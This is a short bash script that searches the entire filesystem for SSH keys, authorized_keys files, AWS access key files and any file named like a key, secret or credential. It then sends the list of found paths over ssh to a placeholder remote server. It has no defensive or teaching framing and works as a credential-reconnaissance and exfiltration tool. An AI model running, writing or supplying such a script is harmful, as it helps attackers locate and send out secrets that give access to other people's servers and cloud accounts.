#!/bin/bash

# Check for SSH keys
echo "Searching for SSH keys..."
ssh_keys=$(find / -type f -name "id_rsa*" -o -name "id_dsa*" -o -name "authorized_keys*" 2>/dev/null)

# Check for AWS keys
echo "Searching for AWS keys..."
aws_keys=$(find / -type f -name "aws_access_key_id" -o -name "aws_secret_access_key" 2>/dev/null)

# Check for other potential keys
echo "Searching for other potential keys..."
other_keys=$(find / -type f -name "*key*" -o -name "*secret*" -o -name "*credentials*" 2>/dev/null)

# Send results to remote server
echo "Sending results to remote server..."
echo -e "SSH Keys:\n$ssh_keys\n\nAWS Keys:\n$aws_keys\n\nOther Potential Keys:\n$other_keys" | ssh user@remote_server "cat > key_search_results.txt"

echo "Key search complete. Results sent to remote server."